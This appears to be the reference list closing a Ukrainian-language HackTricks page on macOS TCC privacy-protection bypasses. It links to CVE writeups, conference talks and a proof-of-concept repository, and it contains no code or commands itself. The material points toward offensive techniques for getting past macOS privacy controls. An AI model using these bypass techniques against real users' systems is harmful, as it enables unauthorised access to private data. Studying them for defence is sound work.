- [2] [Обхід захисту конфіденційності користувачів macOS за допомогою TCC — випадково та навмисно](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 — обхід Location Services у TCC (первинний звіт)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Де у світі Кармен Сандієго: зловживання Location Services у macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs — CVE-2024-44131: TCC bypass викрадає дані з iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite — `test_sqllog.c` (змінні середовища SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple — entitlement для дозволу змінних середовища DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company — нотаризація: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [У malware XCSSET виявлено zero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: «Що відбувається на вашому Mac, залишається в iCloud від Apple?!» — Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Нова вразливість macOS «powerdir» може призвести до несанкціонованого доступу до даних користувача](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Зміна домашнього каталогу й обхід TCC, або CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Увімкнення музики й обхід TCC, або CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Як пограбувати (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 — обхід TCC за допомогою Telegram у macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji — виявлення вразливостей Apple: аудит diskarbitrationd і storagekitd, частина 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle — Objective by the Sea v2.0: синтетичні кліки й перехоплення подій CoreGraphics](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking — підтвердження концепції](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow — налаштування змінних середовища в OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit — CVE-2020-9771: обхід TCC і підвищення привілеїв за допомогою mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit — CVE-2021-30808: обхід TCC шляхом монтування поверх бази даних TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Понад 20 способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Перемога над TCC — понад 20 НОВИХ способів обійти механізми конфіденційності macOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Від Spotlight до Apple Intelligence — зловживання 0day для викрадення даних, на яких працює ШІ macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
